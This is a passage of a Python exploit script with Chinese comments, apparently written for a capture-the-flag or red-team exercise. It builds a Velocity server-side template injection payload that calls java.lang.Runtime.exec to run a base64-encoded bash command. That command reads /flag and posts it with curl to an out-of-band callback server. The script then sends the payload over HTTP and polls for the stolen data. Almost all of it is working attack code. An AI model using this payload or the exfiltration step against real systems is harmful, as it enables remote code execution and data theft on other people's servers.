    \ as oob:\n        oob_url = oob.url  # 获取回调地址\n\n        # Step 2: 构造命令，将 flag\
    \ 通过 curl 发送到 OOB 服务器\n        # 使用管道避免引号展开问题\n        shell_cmd = f\"cat /flag\
    \ | curl -X POST --data-binary @- {oob_url}\"\n        # Base64 编码命令，避免 Velocity\
    \ 模板中特殊字符冲突\n        b64_cmd = base64.b64encode(shell_cmd.encode()).decode()\n\
    \n        # Step 3: 构造 Velocity SSTI payload\n        # 通过 set 指令创建数组，传入 exec()\
    \ 执行\n        payload = (\n            f\"#set($cmd=['bash', '-c', 'echo {b64_cmd}\
    \ | base64 -d | bash'])\"\n            \"#set($x='')\"\n            \"#set($rt=$x.class.forName('java.lang.Runtime'))\"\
    \n            \"#set($ex=$rt.getRuntime().exec($cmd))\"\n        )\n\n       \
    \ # Step 4: 发送 HTTP 请求，触发 SSTI\n        client = redteam_sdk.HttpClient(base_url=TARGET_URL)\n\
    \        try:\n            # 将 payload 作为 text 参数传递\n            resp = client.get(\"\
    /\", params={\"text\": payload})\n            print(f\"[*] HTTP 响应状态码: {resp.status_code}\"\
    )\n        except Exception as e:\n            print(f\"[!] 请求异常: {e}\")\n\n \
    \       # Step 5: 接收 OOB 回调数据\n        print(\"[*] 等待 OOB 回调数据...\")\n       \
    \ data = None\n        try:\n            # 轮询最多 10 秒，等待数据\n            for _ in\
    \ range(10):\n                data = oob.poll(timeout=1)\n                if data:\n\
    \                    break\n            if data:\n                print(f\"[+]\
    \ 收到 OOB 数据: {data.decode(errors='ignore')}\")\n            else:\n          \
    \      print(\"[-] 超时，未收到 OOB 数据\")\n        except Exception as e:\n        \
    \    print(f\"[!] OOB 接收异常: {e}\")\n\n    # 无论是否成功收到 flag，标记脚本执行完成\n    print(\"\
    STEP_OK\")\n\nif __name__ == \"__main__\":\n    exploit()"
